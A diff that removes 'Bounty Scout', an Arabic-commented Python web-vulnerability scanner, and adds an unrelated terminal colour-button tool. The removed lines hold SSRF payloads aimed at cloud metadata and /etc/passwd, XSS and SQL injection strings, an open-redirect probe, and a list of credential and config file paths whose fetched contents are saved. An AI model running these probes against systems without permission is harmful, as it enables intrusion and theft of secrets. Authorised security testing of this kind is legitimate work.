@@ -1,196 +1,153 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# color_buttons.py - أداة تعرض 50 زراً (أرقام 1-50) مع خلفية وأمامية قابلة للتغيير، وتحفظ الإعدادات.
 
-"""
-Bounty Scout - أداة مسح سريعة للثغرات الشائعة (SSRF, IDOR, XSS, ملفات حساسة, SQLi, Open Redirect)
-للاستخدام فقط على الأنظمة التي تملك الإذن باختبارها (برامج المكافآت المصرح بها).
-"""
-
-import requests
-import sys
-import argparse
+import curses
 import json
-import re
-from urllib.parse import urljoin, urlparse
-import time
+import os
+import sys
 
-# ================== الإعدادات ==================
-VERSION = "2.0"
-BANNER = r"""
-  ____        _   _   _                 
- |  _ \      | | | | | |                
- | |_) |_   _| |_| |_| | ___  _   _ ___ 
- |  _ <| | | | __| __| |/ _ \| | | / __|
- | |_) | |_| | |_| |_| | (_) | |_| \__ \
- |____/ \__,_|\__|\__|_|\___/ \__,_|___/
-    v{} - Bug Bounty Recon Tool
-""".format(VERSION)
+CONFIG_FILE = os.path.expanduser("~/.color_buttons_config.json")
 
-# ================== الدوال الأساسية ==================
+# قائمة الألوان المتاحة (أسماء ومقابلاتها في curses)
+COLORS = {
+    'black':   curses.COLOR_BLACK,
+    'red':     curses.COLOR_RED,
+    'green':   curses.COLOR_GREEN,
+    'yellow':  curses.COLOR_YELLOW,
+    'blue':    curses.COLOR_BLUE,
+    'magenta': curses.COLOR_MAGENTA,
+    'cyan':    curses.COLOR_CYAN,
+    'white':   curses.COLOR_WHITE,
+}
+COLOR_NAMES = list(COLORS.keys())
 
-def test_ssrf(target, endpoints, payloads):
-    """اختبار SSRF عبر POST مع معاملات متنوعة"""
-    results = []
-    print("[*] اختبار SSRF...")
-    for ep in endpoints:
-        url = urljoin(target, ep)
-        for p in payloads:
-            try:
-                # محاولة إرسال payload في حقول مختلفة
-                for field in ["url", "link", "target", "uri", "path"]:
-                    r = requests.post(url, json={field: p}, timeout=3)
-                    if any(k in r.text.lower() for k in ["root", "iam", "secret", "aws", "token", "key", "metadata"]):
-                        msg = f"  [SSRF] {url} | field={field} | payload={p} | snippet={r.text[:80]}"
-                        print(msg)
-                        results.append(msg)
-                        break
-            except:
-                pass
-    return results
+# الإعدادات الافتراضية لكل زر (فهرسة من 0 إلى 49)
+DEFAULT_CONFIG = {
+    "fg": ["white"] * 50,
+    "bg": ["black"] * 50
+}
 
-def test_idor(target, endpoints):
-    """اختبار IDOR عبر تغيير المعرفات"""
-    results = []
-    print("[*] اختبار IDOR...")
-    for ep in endpoints:
-        url = urljoin(target, ep)
+def load_config():
+    if os.path.exists(CONFIG_FILE):
         try:
-            r = requests.get(url, timeout=3)
-            if any(k in r.text.lower() for k in ["email", "password", "token", "admin", "phone"]):
-                msg = f"  [IDOR] {url} | snippet={r.text[:80]}"
-                print(msg)
-                results.append(msg)
+            with open(CONFIG_FILE, 'r') as f:
+                data = json.load(f)
+                # التحقق من الصحة
+                if "fg" in data and "bg" in data and len(data["fg"]) == 50 and len(data["bg"]) == 50:
+                    return data
         except:
             pass
-    return results
+    return DEFAULT_CONFIG.copy()
 
-def test_xss(target, params, payloads):
-    """اختبار XSS المنعكس"""
-    results = []
-    print("[*] اختبار XSS...")
-    for param in params:
-        for p in payloads:
-            try:
-                r = requests.get(target, params={param: p}, timeout=3)
-                if p in r.text and p.replace("<", "&lt;") not in r.text:
-                    msg = f"  [XSS] {target}?{param}={p}"
-                    print(msg)
-                    results.append(msg)
-            except:
-                pass
-    return results
+def save_config(cfg):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(cfg, f, indent=2)
 
-def test_sensitive_files(target, paths):
-    """البحث عن ملفات تكوين مكشوفة"""
-    results = []
-    print("[*] البحث عن ملفات حساسة...")
-    for p in paths:
-        url = urljoin(target, p)
+def draw_buttons(stdscr, config, selected_idx, message):
+    stdscr.clear()
+    height, width = stdscr.getmaxyx()
+    # تقسيم إلى 10 أعمدة و 5 صفوف (50 زر)
+    cols = 10
+    rows = 5
+    # حجم الزر: عرض 5 خانات (رقم + مسافات)، ارتفاع سطر واحد
+    # نحسب المسافات لتوسيط الكل
+    total_width = cols * 6  # 5 + مسافة فاصلة
+    start_x = (width - total_width) // 2
+    start_y = 2  # نترك سطرين للأعلى
+
+    for i in range(50):
+        row = i // cols
+        col = i % cols
+        y = start_y + row
+        x = start_x + col * 6
+        if y >= height or x >= width:
+            continue
+        fg_name = config["fg"][i]
+        bg_name = config["bg"][i]
+        fg = COLORS.get(fg_name, curses.COLOR_WHITE)
+        bg = COLORS.get(bg_name, curses.COLOR_BLACK)
+        # إنشاء زوج ألوان فريد لكل زر (رقم الزوج = i+1)
         try:
-            r = requests.get(url, timeout=3)
-            if r.status_code in [200, 403, 401]:
-                snippet = r.text[:200] if r.status_code == 200 else "(ممنوع الوصول)"
-                msg = f"  [Sensitive] {url} | status={r.status_code} | snippet={snippet}"
-                print(msg)
-                results.append(msg)
-                # إذا كان 200، نأخذ عينة
-                if r.status_code == 200:
-                    with open(f"sensitive_{p.replace('/','_')}.txt", "w") as f:
-                        f.write(r.text)
+            curses.init_pair(i+1, fg, bg)
         except:
-            pass
-    return results
+            # إذا فشل، استخدم الافتراضي
+            curses.init_pair(i+1, curses.COLOR_WHITE, curses.COLOR_BLACK)
+        color_pair = curses.color_pair(i+1)
+        # رسم الزر
+        if i == selected_idx:
+            # تمييز الزر المحدد بـ * قبل وبعده
+            label = f"*{i+1:2d}*"
+            stdscr.attron(curses.A_REVERSE)
+            stdscr.addstr(y, x, label, color_pair)
+            stdscr.attroff(curses.A_REVERSE)
+        else:
+            label = f" {i+1:2d} "
+            stdscr.addstr(y, x, label, color_pair)
 
-def test_sqli_openredirect(target, params):
-    """اختبار SQLi و Open Redirect"""
-    results = []
-    print("[*] اختبار SQLi و Open Redirect...")
-    for param in params:
-        # SQLi
-        sqli = "1' OR '1'='1"
-        try:
-            r = requests.get(target, params={param: sqli}, timeout=3)
-            if any(k in r.text.lower() for k in ["sql", "mysql", "syntax", "error", "warning"]):
-                msg = f"  [SQLi] {target}?{param}={sqli}"
-                print(msg)
-                results.append(msg)
-        except:
-            pass
-        # Open Redirect
-        redir = "https://evil.com"
-        try:
-            r = requests.get(target, params={param: redir}, allow_redirects=False, timeout=3)
-            if r.status_code in [301, 302] and "evil.com" in r.headers.get("Location", ""):
-                msg = f"  [Open Redirect] {target}?{param}={redir}"
-                print(msg)
-                results.append(msg)
-        except:
-            pass
-    return results
-
-# ================== الدالة الرئيسية ==================
-
-def main():
-    parser = argparse.ArgumentParser(description="Bounty Scout - أداة مسح سريع للثغرات الشائعة")
-    parser.add_argument("target", help="النطاق المستهدف (مثل https://example.com)")
-    parser.add_argument("--ssrf", action="store_true", help="تفعيل اختبار SSRF")
-    parser.add_argument("--idor", action="store_true", help="تفعيل اختبار IDOR")
-    parser.add_argument("--xss", action="store_true", help="تفعيل اختبار XSS")
-    parser.add_argument("--sensitive", action="store_true", help="تفعيل البحث عن الملفات الحساسة")
-    parser.add_argument("--sqli", action="store_true", help="تفعيل اختبار SQLi و Open Redirect")
-    parser.add_argument("--all", action="store_true", help="تشغيل جميع الاختبارات (الافتراضي)")
-    parser.add_argument("--output", default="bounty_results.txt", help="اسم ملف النتائج النهائي")
-    args = parser.parse_args()
-
-    print(BANNER)
-    print(f"[+] استهداف: {args.target}")
-    print("[+] بدء المسح...\n")
-
-    target = args.target.rstrip('/')
-    all_results = []
-
-    # تحديد الاختبارات
-    run_all = args.all or not (args.ssrf or args.idor or args.xss or args.sensitive or args.sqli)
-
-    if run_all or args.ssrf:
-        endpoints_ssrf = ["/api/proxy", "/api/fetch", "/redirect", "/load", "/get", "/view", "/download", "/image", "/upload"]
-        payloads_ssrf = ["http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin", "file:///etc/passwd", "http://127.0.0.1:3306"]
-        all_results.extend(test_ssrf(target, endpoints_ssrf, payloads_ssrf))
-
-    if run_all or args.idor:
-        endpoints_idor = ["/profile?id=2", "/account?user=2", "/api/v1/user/2", "/admin/view?uid=2", "/order?order_id=2"]
-        all_results.extend(test_idor(target, endpoints_idor))
-
-    if run_all or args.xss:
-        params_xss = ["q", "search", "id", "page", "name", "query"]
-        payloads_xss = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"]
-        all_results.extend(test_xss(target, params_xss, payloads_xss))
-
-    if run_all or args.sensitive:
-        sensitive_paths = [
-            ".env", ".git/config", "config.json", "settings.py", "wp-config.php",
-            "backup.sql", "dump.sql", "admin.php", "debug.php", "test.php",
-            "api/swagger.json", "openapi.json", ".aws/credentials",
-            "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd"
-        ]
-        all_results.extend(test_sensitive_files(target, sensitive_paths))
-
-    if run_all or args.sqli:
-        sqli_params = ["id", "page", "cat", "product", "user", "file", "url", "redirect", "return"]
-        all_results.extend(test_sqli_openredirect(target, sqli_params))
-
-    # حفظ النتائج
-    if all_results:
-        with open(args.output, "w") as f:
-            f.write("\n".join(all_results))
-        print(f"\n[✓] تم العثور على {len(all_results)} ثغرة محتملة. حفظت في {args.output}")
-        print("\n[+] محتوى النتائج:")
-        print("=" * 60)
-        for line in all_results:
-            print(line)
-        print("=" * 60)
+    # عرض التعليمات
+    help_text = f"←↑↓→ تحريك | (f) تغيير الأمامية | (b) تغيير الخلفية | (s) حفظ | (q) خروج | {message}"
+    if len(help_text) < width:
+        stdscr.addstr(height-2, (width-len(help_text))//2, help_text)
     else:
-        print("\n[-] لم يتم العثور على أي ثغرة واضحة.")
+        stdscr.addstr(height-2, 0, help_text[:width-1])
+    stdscr.refresh()
+
+def main(stdscr):
+    curses.curs_set(0)  # إخفاء المؤشر
+    curses.start_color()
+    # تأكد من وجود الألوان الأساسية
+    curses.use_default_colors()
+    # تحميل الإعدادات
+    config = load_config()
+    selected = 0
+    message = ""
+
+    while True:
+        draw_buttons(stdscr, config, selected, message)
+        key = stdscr.getch()
+
+        if key == ord('q') or key == ord('Q'):
+            break
+        elif key == ord('s') or key == ord('S'):
+            save_config(config)
+            message = "تم الحفظ!"
+        elif key == curses.KEY_UP:
+            if selected >= 10:
+                selected -= 10
+        elif key == curses.KEY_DOWN:
+            if selected < 40:
+                selected += 10
+        elif key == curses.KEY_LEFT:
+            if selected % 10 > 0:
+                selected -= 1
+        elif key == curses.KEY_RIGHT:
+            if selected % 10 < 9:
+                selected += 1
+        elif key == ord('f') or key == ord('F'):
+            # تغيير لون الأمامية للزر المحدد
+            current = config["fg"][selected]
+            idx = COLOR_NAMES.index(current) if current in COLOR_NAMES else 0
+            new_idx = (idx + 1) % len(COLOR_NAMES)
+            config["fg"][selected] = COLOR_NAMES[new_idx]
+            message = f"الزر {selected+1} -> أمامية: {COLOR_NAMES[new_idx]}"
+        elif key == ord('b') or key == ord('B'):
+            # تغيير لون الخلفية للزر المحدد
+            current = config["bg"][selected]
+            idx = COLOR_NAMES.index(current) if current in COLOR_NAMES else 0
+            new_idx = (idx + 1) % len(COLOR_NAMES)
+            config["bg"][selected] = COLOR_NAMES[new_idx]
+            message = f"الزر {selected+1} -> خلفية: {COLOR_NAMES[new_idx]}"
+        else:
+            message = f"ضغطت: {key} (غير معروف)"
+
+    save_config(config)  # حفظ تلقائي عند الخروج
+    stdscr.clear()
+    stdscr.addstr(0, 0, "تم الخروج، الإعدادات محفوظة.")
+    stdscr.refresh()
+    stdscr.getch()
 
 if __name__ == "__main__":
-    main()
+    if not curses.has_colors():
+        print("خطأ: المحطة لا تدعم الألوان.")
+        sys.exit(1)
+    curses.wrapper(main)
